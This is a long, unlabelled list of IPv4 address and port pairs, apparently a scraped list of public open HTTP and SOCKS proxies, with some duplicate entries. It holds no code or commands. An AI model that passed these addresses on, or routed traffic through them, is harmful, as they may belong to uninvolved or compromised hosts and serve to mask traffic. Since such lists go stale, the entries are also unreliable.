95.81.87.148:8080
69.167.169.46:57164
184.170.248.5:4145
41.89.16.6:80
188.166.56.246:80
178.128.82.105:58839
109.123.254.43:49074
184.178.172.3:4145
138.68.155.22:40882
137.184.1.49:8459
202.74.243.182:228
213.136.78.200:46064
137.184.1.49:15201
185.129.250.75:2871
5.252.23.206:1080
162.241.79.22:32425
103.215.139.32:30924
173.212.240.168:7435
190.83.15.241:999
135.125.9.103:30409
67.227.196.234:50420
72.167.222.113:46470
5.202.104.22:3128
132.148.245.247:6326
164.132.112.254:43498
8.212.4.168:8081
190.97.238.88:999
27.147.132.124:888
103.178.2.191:3128
162.241.45.22:35469
167.172.100.244:11562
64.23.131.209:8080
148.72.177.90:28106
50.63.13.3:5460
161.97.163.52:2444
185.79.115.129:3128
204.44.192.103:51536
141.94.174.6:41388
185.67.2.63:5566
134.209.74.17:35092
14.143.145.36:80
207.248.108.129:20185
194.233.78.142:35906
183.164.242.203:8089
62.33.207.201:3128
45.11.95.165:5050
202.154.19.197:8080
76.169.129.241:8080
139.99.9.218:9141
103.166.29.14:3125
161.97.173.78:28092
45.76.196.51:80
45.11.95.165:5001
181.205.241.227:999
196.204.83.228:1976
185.129.250.183:10834
85.118.105.20:41128
160.153.245.187:43931
145.255.30.241:8088
102.132.48.198:8080
67.43.227.227:32947
137.184.182.145:11154
41.65.227.119:1976
123.182.59.219:8089
213.136.75.85:57799
162.241.6.97:35944
103.63.190.72:8080
204.157.241.253:999
223.215.176.187:8089
51.38.63.124:6133
45.4.203.115:999
45.128.133.169:1080
182.93.85.225:8080
162.214.191.248:37277
202.142.159.204:31026
187.188.181.181:999
64.225.8.142:10004
88.199.82.66:54194
46.101.223.220:3124
207.180.222.186:52404
183.164.243.161:8089
103.189.234.161:1080
165.227.196.37:60189
188.164.193.178:30663
141.94.174.6:16150
213.251.185.168:3918
82.137.245.41:1080
117.160.250.163:81
138.197.148.215:80
183.247.152.98:53281
103.168.254.134:1080
5.161.98.204:20703
94.246.189.26:4153
147.135.129.229:40539
37.187.135.60:29375
45.56.220.221:60217
188.40.44.95:80
62.171.131.101:38595
62.171.131.101:38595
146.190.108.117:3128
87.106.98.65:80
117.74.65.207:5555
103.178.13.61:3030
176.31.110.126:45517
164.132.112.254:60387
162.243.140.82:17677
162.55.95.91:12578
141.94.174.6:37876
162.55.95.91:14424
67.43.236.20:16121
159.203.137.249:1287
61.129.2.212:8080
51.79.229.230:41670
5.160.73.245:8080
183.165.249.114:8089
216.176.187.99:39811
123.57.1.78:8090
94.130.66.172:59252
114.103.81.197:8089
170.238.104.213:8080
170.81.210.250:8080
38.156.73.131:8080
154.236.179.227:1974
212.5.193.219:8880
74.119.147.209:4145
177.93.45.156:999
94.23.204.27:3128
178.128.82.105:59082
83.168.105.19:8005
104.236.195.90:10000
162.214.111.199:47038
138.118.104.50:999
188.164.197.178:1410
107.180.89.55:7222
189.223.210.120:999
185.23.118.97:61497
177.85.65.177:4153
104.37.135.145:4145
181.209.98.194:999
89.208.35.81:3128
198.12.253.239:49009
203.223.42.249:8090
72.10.160.173:20687
112.111.28.74:3128
183.165.246.193:8089
78.38.93.22:3128
5.189.184.147:18120
50.63.12.33:31785
51.91.149.127:21801
213.6.68.94:5678
64.92.125.42:61778
115.76.193.154:24030
67.43.236.20:5213
46.105.44.29:63616
67.227.196.236:62888
103.153.154.6:80
176.213.141.107:8080
162.55.95.91:45961
68.71.247.130:4145
67.205.177.122:4930
120.194.4.157:5443
171.243.26.172:40078
12.186.205.123:80
46.188.104.108:1080
183.165.245.196:8089
47.106.107.212:3128
162.223.116.75:80
204.44.192.94:55944
162.214.194.127:46834
162.241.46.69:56567
47.99.166.196:8080
184.170.249.65:4145
60.191.244.14:3128
103.35.189.217:3128
172.104.154.229:1559
132.148.130.78:5481
103.5.232.148:8080
202.12.83.1:84
162.241.79.22:42976
189.203.181.34:1080
107.180.101.18:35642
67.227.196.237:54716
103.121.90.216:44419
79.137.204.235:34542
67.205.162.103:40129
202.142.158.114:8080
188.164.197.178:4612
191.102.254.26:8085
202.139.198.15:3060
123.90.183.66:8081
45.56.220.221:64645
192.111.139.163:19404
188.165.237.26:52982
181.78.95.32:999
139.99.9.218:28639
103.154.230.97:5678
94.130.21.228:46332
223.27.144.34:8080
147.135.129.229:22444
159.203.137.249:39296
132.248.159.223:3128
210.211.113.35:80
117.57.92.207:8089
124.223.186.186:80
111.20.217.178:9091
201.71.3.42:999
68.178.206.246:8862
103.178.20.198:3125
67.43.236.20:16293
213.251.185.168:3563
154.236.176.28:1981
92.205.105.119:31545
64.188.48.165:31188
184.168.121.153:14558
103.127.56.236:5678
161.97.160.158:13197
148.72.177.90:64947
77.46.138.33:33608
72.10.164.178:12425
67.213.212.36:47481
47.254.90.125:8008
103.118.46.176:8080
203.19.38.114:1080
162.241.79.22:40036
94.100.26.202:80
36.6.144.242:8089
144.217.237.178:26931
119.18.149.34:8080
137.184.1.49:14204
132.148.154.97:38315
72.167.38.7:49607
117.69.237.43:8089
45.11.95.165:5003
161.97.160.158:13197
161.97.147.193:19655
117.57.92.152:8089
5.189.184.147:44097
91.121.163.199:13015
45.81.232.17:5931
173.212.237.43:2700
172.93.110.144:1160
79.137.204.235:10005
79.137.198.31:10201
92.205.129.134:5530
154.65.39.8:80
45.132.235.193:6382
20.106.146.212:6001
39.165.0.137:9002
184.178.172.14:4145
45.56.220.221:60217
67.43.236.20:9155
117.74.65.207:39732
183.238.165.170:9002
192.252.208.70:14282
194.233.78.142:33551
43.133.136.208:8800
103.139.242.169:82
107.180.95.177:7845
98.170.57.249:4145
36.91.148.38:8080
148.77.34.200:54321
162.243.184.21:10001
117.54.114.96:80
67.201.59.70:4145
178.72.89.106:8080
103.35.153.74:8080
62.33.207.202:80
172.104.154.229:6651
85.62.10.83:8080
67.43.236.22:15437
54.36.108.149:55895
5.189.184.147:36132
67.43.227.227:30885
51.89.173.40:17982
109.123.254.43:40661
51.38.63.124:60484
192.111.134.10:4145
51.254.167.41:22763
61.8.70.114:2023
178.128.82.105:46323
207.244.229.34:43066
183.164.243.237:8089
198.12.253.60:5398
107.180.88.173:61291
208.87.131.151:20971
178.128.36.97:61077
188.164.196.31:62105
51.79.229.230:54457
37.187.91.192:27898
128.199.104.93:8000
41.65.236.48:1981
171.254.216.146:1080
162.0.238.147:80
45.81.232.17:2073
41.33.66.250:1981
194.233.78.142:36431
154.236.177.123:1976
69.75.140.157:8080
45.128.133.193:1080
137.184.1.49:23787
171.244.10.204:15389
132.148.129.254:45883
103.48.71.102:84
51.195.115.14:8080
164.132.112.254:57553
189.142.202.230:999
188.164.196.30:51284
84.254.0.86:32650
198.8.94.170:4145
45.56.119.212:8015
192.111.139.165:4145
171.243.26.172:40062
192.169.226.96:29618
72.206.181.97:64943
207.180.198.241:45718
47.74.152.29:8888
202.61.204.51:80
181.115.75.102:5678
154.236.191.45:1976
139.162.78.109:8080
188.164.197.178:61718
185.129.250.75:4260
171.243.26.172:40126
184.170.248.5:4145
104.200.152.30:4145
139.59.61.193:45888
103.159.194.249:8080
148.72.206.131:45395
51.89.21.99:31924
142.4.9.155:5043
130.245.128.193:8080
102.212.86.57:8080
103.11.134.46:3730
157.245.130.145:23642
120.78.207.243:3128
209.59.158.93:54716
85.62.10.84:8080
103.165.218.234:8085
92.204.134.38:1555
31.148.207.153:80
51.75.126.150:53336
94.131.107.45:1080
68.183.140.104:40670
117.160.250.133:80
178.32.6.164:13831
111.38.73.92:9002
171.243.26.172:40334
202.0.103.115:80
62.171.131.101:21043
204.44.192.104:56149
107.181.168.145:4145
102.212.86.37:8080
195.93.172.32:3128
95.111.237.46:45738
47.254.90.125:8000
190.14.32.209:5678
138.97.37.115:8189
58.147.186.214:3125
67.227.196.234:54716
104.236.195.90:10002
103.162.154.14:8888
64.189.106.6:3129
23.152.40.14:3128
202.154.19.163:8080
37.187.91.192:11721
36.88.111.250:8787
112.51.96.118:9091
103.216.50.225:8080
162.214.225.223:55483
46.63.69.104:80
171.243.26.172:40070
184.168.121.153:26904
117.160.250.130:8899
45.11.95.165:5206
142.54.229.249:4145
51.79.229.230:42448
38.242.238.254:46773
45.11.95.165:5012
162.55.95.91:14896
94.23.83.53:7306
88.202.230.103:44277
51.222.241.157:22538
49.12.126.53:54414
140.238.25.255:21000
103.139.188.41:7077
162.55.95.91:40289
92.205.107.162:47499
159.203.137.249:25804
107.180.90.42:34692
94.228.162.155:32098
188.164.196.30:62564
161.97.170.209:24274
109.205.181.27:7663
45.11.95.166:6008
200.229.27.186:8974
72.10.160.172:2087
159.65.217.197:8000
198.12.253.239:49094
164.92.109.53:51263
178.128.113.118:23128
12.68.66.213:16099
58.210.212.109:80
162.241.45.22:42713
158.180.16.252:80
162.55.95.91:12216
45.91.93.166:28833
72.37.216.68:4145
67.43.236.20:27301
51.68.230.210:2565
67.43.236.20:7319
122.155.165.191:3128
188.165.226.128:59307
181.129.130.18:8154
184.170.245.148:4145
162.0.220.216:18701
72.167.54.228:38459
141.94.174.6:47913
45.11.95.165:6001
142.54.229.249:4145
51.195.137.62:59403
167.99.39.82:13486
162.241.53.72:49745
107.181.161.81:4145
162.214.191.248:62529
116.203.131.14:4142
162.214.163.137:20826
188.40.44.83:80
134.19.254.2:21231
93.188.161.84:80
62.171.131.101:22315
5.161.98.204:58199
51.255.79.114:24726
172.245.159.177:80
114.67.113.118:45212
186.227.112.65:8080
117.69.236.114:8089
144.91.115.113:42000
142.54.226.214:4145
98.162.25.7:31653
171.244.10.204:15389
141.94.174.6:41866
37.44.238.2:52611
139.162.78.109:3128
194.233.79.104:53442
158.69.55.204:49644
154.236.191.40:1976
181.10.123.154:999
36.6.144.194:8089
139.162.238.184:35100
98.170.57.231:4145
98.170.57.231:4145
213.251.185.168:28803
66.94.118.230:16805
190.63.35.30:9812
132.148.129.254:45366
183.236.232.160:8080
117.74.65.215:8024
95.111.227.164:57421
8.34.208.46:80
51.75.126.150:19322
66.94.118.230:8317
98.162.25.4:31654
185.129.250.183:37116
125.94.219.96:9091
45.81.232.17:5296
34.87.84.105:80
72.10.164.178:10689
117.74.65.207:53446
34.92.12.210:9238
168.138.36.239:3128
166.62.53.45:47777
164.132.112.254:20689
95.111.227.164:57421
194.233.78.142:45219
67.213.212.55:20700
103.152.101.109:8080
113.223.213.153:8089
138.68.155.22:35650
67.227.196.234:50420
51.83.132.102:52658
103.255.132.37:8080
206.0.172.35:999
148.72.177.90:63853
54.39.50.68:58971
94.228.194.18:41890
162.243.140.82:44259
103.36.35.135:8080
213.251.185.168:9922
51.38.63.124:31900
107.180.88.195:8337
207.180.222.186:62668
51.210.45.148:60359
171.243.26.172:40126
117.160.250.163:80
137.184.85.97:5634
193.122.124.231:2335
103.29.90.66:32650
148.72.177.90:64947
72.206.181.103:4145
109.123.253.20:57906
58.20.248.139:9002
185.5.209.101:80
45.11.95.165:6011
95.167.19.151:3128
188.164.196.30:64988
164.132.112.254:35801
194.233.78.142:39852
51.75.126.150:41271
207.180.222.186:24764
65.21.99.70:7444
117.1.252.143:9039
173.212.253.25:31224
13.81.217.201:80
113.161.131.43:80
51.38.63.124:10983
207.244.229.34:49654
91.203.242.66:222
216.215.125.178:48324
92.205.107.162:29187
45.79.189.110:8227
185.32.47.145:4153
50.63.12.33:23065
170.187.150.68:8193
82.180.132.69:80
50.96.204.7:18351
88.204.216.142:36120
118.69.233.165:8080
1.179.217.11:8080
172.252.1.141:3128
213.251.185.168:24886
51.79.229.230:35680
188.132.222.18:8080
67.43.236.20:19655
109.123.254.43:23901
69.61.200.104:36181
182.191.84.39:80
162.241.53.72:49745
162.55.95.91:19900
110.235.249.152:25566
144.91.66.30:6847
184.181.217.210:4145
67.43.227.227:16013
94.228.162.155:14769
103.121.90.216:40961
154.236.179.226:1975
117.74.65.207:30000
103.11.134.46:38882
72.10.160.170:19975
210.72.11.46:8080
103.44.116.90:3128
181.78.23.170:4153
114.5.97.150:8080
103.121.90.216:44419
91.121.163.199:11413
103.52.144.242:8080
128.199.221.91:16801
146.59.178.220:12438
184.178.172.11:4145
110.78.146.49:3127
128.199.183.41:64097
61.7.157.51:8080
164.92.86.113:54558
183.164.242.155:8089
64.225.8.118:10008
115.187.31.178:8080
62.171.131.101:35237
47.229.171.150:3128
49.0.91.7:3128
103.230.126.123:60235
171.244.10.204:10177
45.81.232.17:5296
45.71.184.133:8080
129.151.233.36:3128
67.43.236.20:9839
223.112.53.2:1025
139.162.181.177:29345
61.254.81.88:9000
67.43.236.20:27293
51.79.87.144:41230
81.18.54.228:1080
72.167.54.228:19140
195.225.142.169:8080
200.94.102.148:999
67.43.227.227:22099
190.217.20.109:999
222.243.201.153:9992
67.227.196.234:62888
154.236.177.104:1976
45.118.132.180:45449
191.7.208.101:31576
72.10.160.174:16781
12.186.205.120:80
103.162.16.34:5678
213.251.185.168:45125
144.91.69.188:62994
50.63.13.3:4303
203.188.245.98:52837
103.183.63.14:82
117.69.233.194:8089
165.227.196.37:63091
192.99.169.19:8453
107.180.91.248:57846
72.10.160.172:29619
103.121.90.216:6422
51.79.229.230:20758
103.131.18.194:8080
183.164.243.215:8089
45.11.95.165:5046
103.168.254.62:8085
213.133.98.201:1369
36.67.88.77:4153
92.205.107.159:62888
163.172.147.89:16379
144.217.253.110:64951
115.127.13.154:8880
173.212.237.43:54938
23.254.231.55:80
117.74.65.215:8096
67.43.227.227:10113
68.183.48.146:10007
103.189.123.149:80
161.97.115.244:39234
201.174.17.126:7755
103.81.214.254:83
188.164.193.178:8500
115.75.99.65:8080
117.160.250.138:80
213.251.185.168:40015
49.12.126.53:49665
45.32.1.78:20473
103.108.88.41:8080
103.95.98.33:1088
111.225.153.136:8089
201.46.24.174:3128
103.167.222.1:1111
110.238.109.146:808
66.42.224.229:41679
155.94.241.132:3128
122.176.48.148:80
111.225.152.114:8089
107.180.88.173:44354
51.68.230.210:2565
54.36.108.149:57959
207.180.226.58:59932
147.124.212.31:10652
148.72.215.230:3616
200.60.172.226:999
170.187.150.68:54766
198.12.251.108:57614
191.252.178.188:3128
37.221.197.165:80
67.227.196.237:50420
45.11.95.165:5035
38.253.88.242:999
98.162.25.23:4145
72.167.222.102:64619
64.225.8.142:10000
159.223.71.71:63731
92.205.61.38:61462
8.242.85.3:999
208.87.131.151:3234
207.180.222.186:24764
74.252.14.169:60056
41.65.236.39:1981
84.19.58.66:42931
167.99.123.158:63514
204.44.192.104:53783
103.163.244.4:83
181.209.98.195:999
199.229.254.129:4145
108.170.12.14:80
183.238.163.8:9002
190.61.45.43:999
177.135.83.244:5678
67.43.227.227:1345
111.224.213.154:8089
186.250.29.225:8080
167.249.29.215:999
45.11.95.165:6015
201.157.254.26:8080
69.167.169.46:49294
162.241.79.22:35931
119.18.146.114:5020
103.137.160.186:8090
203.128.75.194:8080
155.94.241.130:3128
173.212.237.43:11331
162.241.41.87:35821
62.33.207.201:80
183.165.250.202:8089
106.14.255.124:80
51.210.45.148:36424
207.244.252.14:35776
41.65.55.3:1981
195.201.173.249:42922
181.10.200.154:3128
46.99.252.42:10805
170.187.150.68:50029
207.180.222.186:15717
103.181.168.213:8080
135.181.30.244:10907
92.205.60.110:15924
173.212.223.23:5124
51.79.87.144:30464
45.11.95.165:5023
161.97.170.209:25328
192.111.137.34:18765
45.11.95.165:6003
184.178.172.11:4145
91.235.220.122:80
123.233.245.158:9080
202.5.16.44:80
135.125.9.103:8492
103.165.138.234:8080
154.85.58.149:80
103.213.97.74:80
162.55.95.91:49096
67.43.227.228:2981
89.216.120.176:4153
162.55.95.91:11744
189.250.121.213:80
51.161.131.84:36550
111.225.152.130:8089
51.75.126.150:21803
77.37.130.80:3127
185.25.205.141:80
67.43.228.253:2431
79.137.198.31:33344
178.128.82.105:62009
37.187.77.58:64494
114.106.173.58:8089
67.43.227.227:5497
117.69.233.112:8089
190.12.95.170:37209
159.203.137.249:1972
175.6.36.113:1080
162.214.67.122:19182
121.40.62.167:3128
162.243.140.82:62117
198.12.255.193:10729
184.168.121.153:6471
194.29.101.140:3128
202.95.12.142:3128
123.182.59.3:8089
45.5.118.32:999
119.39.68.41:2323
213.251.185.168:30232
190.120.254.233:999
192.169.226.96:32074
67.43.227.227:25441
89.187.157.186:8080
104.36.166.34:23172
109.123.253.20:49575
187.134.49.129:8080
207.180.234.220:39323
67.43.236.20:27015
221.168.32.66:9050
125.99.106.250:3128
174.138.176.77:37605
92.205.60.110:15924
165.227.0.192:80
184.181.217.194:4145
198.27.82.143:35425
207.180.222.186:11191
98.181.137.83:4145
67.43.236.20:26671
51.210.45.148:59612
104.238.111.107:7757
139.59.61.193:40408
161.97.173.78:19133
72.195.34.41:4145
67.43.236.20:8019
39.109.116.45:3128
155.94.241.134:3128
111.199.238.198:9000
67.227.196.234:64887
66.70.225.202:8050
67.43.236.20:31583
192.111.137.37:18762
98.162.25.7:31653
38.56.23.1:999
92.246.139.113:12250
107.181.168.145:4145
94.130.66.172:13760
159.203.137.249:13471
162.241.66.135:34375
82.137.244.244:80
111.16.50.12:9002
114.255.132.60:3128
188.133.160.22:4145
154.12.253.232:16504
147.124.212.31:2203
103.124.196.134:8080
51.79.229.230:28242
219.243.212.118:8443
138.68.24.185:55010
107.180.88.173:44354
103.130.80.50:8080
14.143.145.38:80
94.23.220.136:35805
92.205.107.159:51600
138.68.225.200:80
1.179.148.33:1080
103.215.139.32:31625
132.148.245.247:38315
79.143.187.58:55215
51.210.45.148:19873
194.233.79.104:59072
39.105.27.30:3128
185.23.118.97:53153
201.77.108.25:999
66.94.118.230:55464
103.234.24.105:8880
38.242.251.177:39139
103.152.232.84:8080
49.12.126.53:54414
113.208.119.142:9002
181.10.123.156:999
67.227.196.235:54716
192.163.202.88:32263
82.146.37.145:80
162.0.220.234:28473
187.102.236.209:999
185.208.101.219:8080
154.12.253.232:18545
117.160.250.163:8828
219.93.101.60:80
161.97.173.42:37455
95.245.162.27:8181
103.163.13.112:8080
91.121.163.199:21670
45.239.28.1:999
117.160.250.138:8899
116.50.174.181:17066
209.142.64.219:39789
72.210.252.137:4145
31.47.37.114:8080
200.19.177.120:80
162.215.221.243:30390
190.104.47.238:8080
68.71.254.6:4145
203.143.30.25:8080
92.204.134.38:15393
51.210.45.148:11176
49.229.36.170:4153
31.170.53.140:80
1.179.148.9:55636
171.100.84.247:3128
72.10.160.90:21529
139.162.181.177:55222
216.137.184.253:80
49.7.11.187:80
162.55.95.91:6790
70.63.90.245:8080
102.132.50.49:8080
213.251.185.168:4683
213.251.185.168:51209
200.24.141.161:999
64.20.62.75:43068
68.178.204.46:24831
104.248.151.220:60915
45.65.227.161:999
80.82.77.2:47075
1.1.189.58:8080
171.244.140.160:45578
213.251.185.168:12345
202.12.80.11:83
103.154.90.190:3128
188.164.196.30:49426
72.167.54.228:52919
80.241.223.13:15353
86.110.189.154:4145
159.223.71.71:51213
49.231.15.27:8080
5.189.184.147:3105
92.205.107.159:51600
38.242.251.177:54964
37.27.6.46:80
139.162.181.177:16593
139.59.61.193:6373
194.163.160.203:3358
159.192.102.249:8080
36.6.145.100:8089
2.139.187.83:3128
128.199.183.41:4065
45.77.162.115:8888
67.43.227.227:32505
51.83.132.102:22413
185.129.250.183:10834
47.51.51.190:8080
188.164.193.178:7001
104.248.151.220:59755
41.209.10.33:84
118.117.189.146:8089
194.233.78.142:47152
45.11.95.165:5015
172.104.154.229:1559
46.182.6.69:43585
213.207.43.143:443
151.236.39.7:57248
75.119.145.154:42133
188.132.222.47:8080
148.72.206.84:60926
46.173.175.166:10801
159.203.137.249:45544
36.6.144.205:8089
220.248.70.237:9002
183.164.242.151:8089
185.129.250.75:11921
123.13.218.68:9002
221.231.24.94:9002
134.122.5.111:9601
191.53.112.170:45619
207.180.226.58:33255
109.70.187.44:1080
45.233.170.75:999
207.180.198.241:37209
89.213.187.227:5534
117.69.233.3:8089
144.91.66.30:31498
166.62.88.163:18951
141.94.174.6:37057
92.205.61.38:28352
65.21.131.83:2823
207.180.226.58:44977
199.58.185.9:4145
183.164.242.216:8089
51.89.21.99:23158
72.210.252.134:46164
174.138.176.76:51143
62.171.131.101:21043
51.38.63.124:52117
103.118.240.240:80
162.55.95.91:35930
173.249.53.61:6580
162.241.115.85:64574
69.167.169.46:51444
179.1.192.17:999
165.227.196.37:54280
103.179.139.81:1111
190.6.23.219:999
213.136.79.177:43323
103.167.70.130:8080
128.199.252.22:8000
51.38.63.124:20213
67.43.236.20:1259
72.10.160.174:2121
185.104.112.62:80
198.12.251.108:57614
200.179.83.144:3128
213.251.185.168:12096
51.210.4.123:58244
173.212.240.168:4484
67.201.33.10:25283
184.181.217.220:4145
213.251.185.168:64556
102.67.101.242:8080
94.23.220.136:40767
120.77.148.138:8080
67.43.227.227:8065
141.95.104.32:3128
103.155.166.150:8181
107.180.91.248:4843
123.182.59.4:8089
184.178.172.18:15280
162.240.49.196:60931
103.49.114.195:8080
51.255.79.114:47082
183.164.242.28:8089
141.94.174.6:40280
213.136.78.200:19885
103.118.46.61:8080
36.6.145.95:8089
183.164.243.89:8089
37.187.77.58:29380
72.195.34.42:4145
207.180.222.186:62668
159.65.77.168:8585
45.11.95.165:5219
67.55.186.25:8080
62.72.57.240:80
116.202.235.157:63135
141.94.174.6:25214
148.72.177.90:2466
161.97.173.42:60693
45.11.95.165:6049
67.43.236.20:32737
162.241.46.69:56567
138.197.16.249:10009
190.80.188.90:999
161.97.143.60:44908
72.167.54.228:55449
178.33.162.89:56883
162.214.225.223:33563
54.36.122.16:57906
72.210.221.223:4145
79.137.198.31:30369
128.199.187.210:8000
173.249.33.122:16708
132.148.129.254:41026
45.95.233.198:1080
43.131.228.91:15673
139.162.181.177:44709
198.12.253.239:33867
67.213.212.57:23549
164.132.112.254:34439
192.111.137.34:18765
168.138.173.113:49303
72.10.160.172:20339
194.233.81.116:14344
148.72.215.230:3616
137.184.182.145:47132
72.167.38.7:46462
51.38.63.124:10983
137.184.1.49:30808
51.79.229.230:35680
141.94.174.6:41920
200.229.27.188:9508
162.214.195.64:9144
164.92.237.188:63722
162.0.220.222:28473
173.249.33.122:62690
162.55.95.91:31278
183.164.242.207:8089
103.29.238.4:8090
213.251.185.168:64758
164.92.86.113:54683
51.210.45.148:19873
18.231.33.117:3128
159.203.137.249:64486
213.251.185.168:4683
45.11.95.165:5018
45.11.95.165:5049
104.238.111.107:36049
185.191.236.162:3128
49.12.126.53:39794
92.205.108.94:24837
188.164.196.31:51284
117.74.65.215:3129
184.178.172.18:15280
46.175.150.47:2367
41.65.236.58:1981
103.11.134.46:13488
181.209.100.2:999
103.76.151.133:8181
185.129.250.183:37116
98.188.47.132:4145
111.224.212.168:8089
117.160.250.163:9999
213.21.56.20:4153
185.23.118.103:59827
109.238.12.156:27241
92.204.135.203:60931
103.180.123.141:8080
67.43.227.228:15165
79.137.204.40:10006
67.43.228.253:12183
111.225.152.100:8089
172.104.154.229:22930
192.252.211.197:14921
65.21.178.129:55029
46.182.6.69:50594
80.82.77.2:40655
152.228.134.212:33737
79.137.198.31:33297
117.69.232.131:8089
146.56.154.83:21000
103.149.56.98:80
67.43.227.227:24653
207.180.222.186:60941
204.44.192.103:62714
172.104.154.229:25387
181.28.111.161:8080
62.171.131.101:31588
185.200.37.244:8080
222.88.167.22:9002
147.124.212.31:34219
67.201.33.10:25283
195.116.155.169:3629
184.181.217.213:4145
88.84.62.5:4153
213.184.153.66:8080
117.69.233.201:8089
158.69.55.204:50248
198.12.253.239:49094
51.79.229.230:20758
208.87.131.151:37110
88.202.230.103:44277
141.94.174.6:3096
67.205.177.122:4930
114.232.109.243:8089
49.249.155.3:80
203.96.177.211:44995
47.116.126.120:3128
200.80.227.234:4145
188.164.196.31:62105
109.123.254.43:31167
181.78.94.189:999
167.86.115.250:25027
27.79.224.23:3128
15.235.87.181:59833
162.214.227.68:55845
207.180.222.186:10640
37.44.238.2:53471
103.159.194.241:8080
64.62.200.198:3128
76.26.114.253:39593
95.71.125.50:49882
85.185.238.74:8080
67.43.236.20:10613
196.61.44.54:5678
183.88.219.206:34676
167.99.131.11:80
15.235.143.42:33128
137.220.61.75:57445
161.97.147.193:12762
208.87.131.151:25369
198.12.255.193:13531
202.29.218.138:4153
66.94.118.230:55464
111.225.152.207:8089
192.252.209.155:14455
213.136.78.200:23631
135.181.30.244:56849
107.180.91.0:55076
154.236.191.48:1976
109.107.189.214:80
148.72.212.198:61702
24.230.33.96:3128
122.9.4.213:80
194.233.78.142:33551
160.248.80.91:443
135.181.30.244:49504
207.180.222.186:15717
67.43.227.227:4231
109.123.253.20:57153
70.166.167.55:57745
50.62.58.158:53766
113.160.247.27:19132
103.44.239.244:80
107.180.95.93:56026
141.94.174.6:33466
192.111.137.35:4145
213.251.185.168:46838
49.12.126.53:39794
115.171.217.48:7891
195.154.43.184:10810
204.44.192.80:56149
51.38.63.124:17601
155.138.208.41:30136
192.252.211.197:14921
46.101.186.238:80
67.43.227.227:3355
61.133.66.69:9002
72.10.164.178:18953
173.249.20.84:59079
190.4.205.226:4153
102.176.103.134:8080
62.103.66.18:3128
5.42.73.68:8080
109.123.254.43:11227
79.137.194.122:1234
92.180.50.202:8443
210.2.132.52:8080
213.136.93.115:54612
45.229.6.41:999
107.180.95.93:29668
94.130.21.228:26507
213.251.185.168:16901
135.125.9.103:41001
220.152.112.150:1088
162.19.7.46:34732
207.180.222.186:37871
188.132.222.9:8080
36.67.7.74:8080
103.162.31.23:49935
67.43.227.227:25409
113.143.37.82:9002
198.199.115.151:35792
162.214.102.121:12943
103.78.171.10:84
103.162.50.13:8080
119.3.14.229:8080
172.104.154.229:16422
88.198.135.234:5135
103.114.95.147:8080
104.45.128.122:80
162.241.115.85:58480
116.97.240.147:4995
162.241.46.54:56567
111.225.153.90:8089
115.244.127.160:80
162.55.95.91:44750
49.254.107.45:23325
186.179.43.74:12345
103.146.184.141:1111
72.167.220.208:44405
51.15.254.129:16379
213.136.79.177:43323
124.78.140.65:1080
51.38.49.98:63243
116.104.193.155:6789
120.25.1.15:7890
192.111.139.165:4145
92.205.107.159:60034
162.243.140.82:44259
162.55.95.91:6228
85.185.158.78:8080
159.203.137.249:10942
192.163.204.80:21281
183.165.250.228:8089
41.65.251.83:1981
99.56.147.242:56250
103.172.71.15:8080
200.24.130.68:6696
38.253.80.32:999
51.38.63.124:23778
51.89.173.40:26545
221.153.92.39:80
185.169.183.5:8080
178.33.162.89:50682
213.251.185.168:15598
104.36.166.42:46251
5.42.78.239:10005
154.12.178.107:29985
187.108.60.54:8080
104.248.158.78:14673
122.3.139.85:1080
54.39.50.68:28802
51.210.45.148:9351
178.253.236.139:8080
103.35.189.217:1080
117.207.147.21:3127
103.68.1.74:8080
183.215.23.242:9091
79.137.248.127:10005
162.241.50.179:49745
182.16.171.42:43188
139.59.73.26:1532
128.199.252.36:8000
162.55.95.91:10688
34.85.219.2:3128
45.81.232.17:1262
66.29.128.242:61701
12.68.66.125:16099
20.219.137.240:3000
162.241.45.22:42713
103.216.49.233:8080
60.12.168.114:9002
123.182.58.219:8089
67.43.227.227:26513
159.65.245.255:80
207.180.222.186:18844
54.36.122.16:56027
207.180.222.186:29588
154.236.191.46:1976
51.68.230.210:6245
114.97.89.75:8089
119.93.148.191:8080
12.7.109.1:9812
129.80.194.210:3128
210.200.169.134:33333
162.215.15.63:54511
164.132.112.254:43498
54.36.229.120:80
184.82.130.44:8080
94.41.124.91:8080
162.214.225.223:40656
103.221.254.59:1088
77.65.50.118:51569
162.55.95.91:31058
67.43.236.20:12575
91.189.177.189:3128
67.43.228.253:8969
190.128.201.235:3128
170.245.132.15:999
138.128.148.192:6752
117.69.237.11:8089
111.90.143.184:3128
139.129.162.65:3128
34.23.45.223:80
115.96.208.124:8080
162.55.95.91:59493
14.103.26.53:8000
222.174.178.122:4999
103.209.88.70:8080
113.176.95.208:8080
85.214.107.177:80
23.132.48.1:999
103.83.232.122:80
61.186.243.6:9002
45.176.95.38:999
201.77.108.1:999
190.145.165.238:999
177.135.36.186:8080
38.87.239.141:53281
103.156.17.153:8080
83.219.145.108:3128
24.152.50.130:8080
162.55.95.91:19900
103.189.249.163:1111
45.188.164.3:1994
108.170.12.11:80
209.126.6.159:80
72.10.160.90:3247
77.46.138.38:8080
113.223.212.6:8089
162.248.224.81:3130
36.91.115.133:80
103.148.192.83:8089
36.95.27.225:8080
103.87.171.83:32650
72.10.160.170:29891
51.159.0.236:2020
217.52.247.79:1976
202.12.80.14:84
142.93.120.158:8000
67.43.228.253:5453
188.132.222.70:8080
119.92.70.8:8082
133.242.229.79:33333
202.65.158.237:82
181.143.143.126:999
190.6.23.222:999
67.43.227.227:29985
123.182.58.79:8089
36.64.156.62:8080
147.182.180.242:80
39.62.10.188:8082
72.10.164.178:25701
103.138.185.1:83
103.169.254.185:8068
188.235.0.207:8181
191.102.254.12:8084
47.243.92.199:3128
47.89.184.18:3128
177.54.229.164:9292
165.16.25.41:1981
111.224.213.130:8089
205.233.79.218:999
103.84.177.26:8083
43.231.22.229:80
195.146.151.105:8085
164.90.184.248:80
162.55.95.91:39414
219.243.212.118:8443
113.223.214.177:8089
67.43.236.20:27317
78.28.152.111:80
111.95.40.244:8080
81.200.154.182:8443
139.59.1.14:8080
117.160.250.163:8080
67.43.236.20:26767
103.178.42.26:8181
183.164.242.169:8089
154.236.177.117:1976
122.228.85.194:8888
122.185.180.190:32650
62.148.236.112:34793
120.78.201.239:3128
190.115.7.141:1982
58.246.58.150:9002
212.89.188.115:21231
187.40.1.122:128
111.225.152.72:8089
79.137.205.64:14045
117.160.250.163:82
14.143.75.250:80
14.207.149.119:8080
45.11.95.165:6028
67.43.236.20:3995
103.146.196.97:32650
72.10.160.90:27707
94.247.244.120:3128
137.63.147.2:80
138.197.20.244:10003
